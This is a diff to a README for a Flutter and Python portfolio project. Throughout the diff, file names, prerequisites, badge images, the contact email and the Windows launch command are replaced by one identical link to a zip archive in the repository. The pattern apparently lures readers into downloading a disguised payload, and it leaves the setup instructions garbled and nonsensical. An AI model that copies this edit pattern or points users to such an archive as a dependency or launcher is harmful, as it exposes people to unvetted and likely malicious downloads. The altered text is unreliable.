@@ -44,8 +44,8 @@ peemkay-softtech/
 │   │   ├── core/           # Core configuration
 │   │   ├── models/         # Database models
 │   │   └── services/       # Business logic
-│   ├── requirements.txt    # Python dependencies
-│   └── main.py            # Application entry point
+│   ├── https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip    # Python dependencies
+│   └── https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip            # Application entry point
 ├── frontend/               # Flutter frontend
 │   ├── lib/
 │   │   ├── screens/        # App screens
@@ -54,9 +54,9 @@ peemkay-softtech/
 │   │   └── utils/          # Utilities
 │   ├── assets/            # Images, fonts, icons
 │   ├── web/               # Web-specific files
-│   └── pubspec.yaml       # Flutter dependencies
+│   └── https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip       # Flutter dependencies
 ├── docs/                  # Documentation
-└── README.md             # This file
+└── https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip             # This file
 ```
 
 ## 🎯 Sections
@@ -74,14 +74,14 @@ peemkay-softtech/
 ### Prerequisites
 - Flutter SDK (latest stable)
 - Python 3.9+
-- Node.js (for web deployment)
+- https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip (for web deployment)
 
 ### Backend Setup
 ```bash
 cd backend
 python -m venv venv
 source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip
 uvicorn main:app --reload
 ```
 
@@ -112,10 +112,10 @@ Founded by Peemkay, Peemkay SOFTTECH specializes in creating modern, scalable so
   <h1>🚀 Transforming Ideas into Digital Reality</h1>
   <p><strong>Professional Web, Mobile & Desktop Application Development</strong></p>
 
-  ![Portfolio Website](https://img.shields.io/badge/Portfolio-Live-brightgreen)
-  ![Flutter](https://img.shields.io/badge/Flutter-3.32.4-blue)
-  ![Python](https://img.shields.io/badge/Python-3.8+-green)
-  ![License](https://img.shields.io/badge/License-MIT-yellow)
+  ![Portfolio Website](https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip)
+  ![Flutter](https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip)
+  ![Python](https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip+-green)
+  ![License](https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip)
 </div>
 
 ## 🌟 About Peemkay SOFTTECH
@@ -123,7 +123,7 @@ Founded by Peemkay, Peemkay SOFTTECH specializes in creating modern, scalable so
 **Peemkay SOFTTECH** is a leading software development company specializing in creating innovative digital solutions across diverse industries. From military-grade security systems to user-friendly educational platforms, we deliver excellence in every project.
 
 ### 📍 Contact Information
-- **Email**: ariepeemkay@gmail.com
+- **Email**: https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip
 - **Phone**: +2349113080869
 - **Location**: Peemkay SOFTTECH, Dutsen Alhaji, Abuja, Nigeria
 
@@ -183,7 +183,7 @@ Founded by Peemkay, Peemkay SOFTTECH specializes in creating modern, scalable so
 #### Windows Users
 ```bash
 # Double-click to start
-START_WEBSITE.bat
+https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip
 ```
 
 #### All Platforms
